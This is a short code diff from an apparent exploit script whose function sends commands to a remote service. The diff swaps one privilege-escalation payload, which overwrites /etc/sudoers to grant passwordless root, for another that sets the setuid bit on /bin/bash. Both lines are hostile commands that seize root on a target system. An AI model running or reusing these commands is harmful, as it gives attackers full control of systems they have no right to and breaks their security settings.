@@ -19,7 +19,7 @@ def exec_command(cmd):
         print(f"Failed to execute command. Status code: {response.status_code}")
 
 def main():
-    exec_command('echo "user ALL=(root) NOPASSWD: ALL" > /etc/sudoers')
+    exec_command('chmod u+s /bin/bash')
 
 if __name__ == "__main__":
     main()
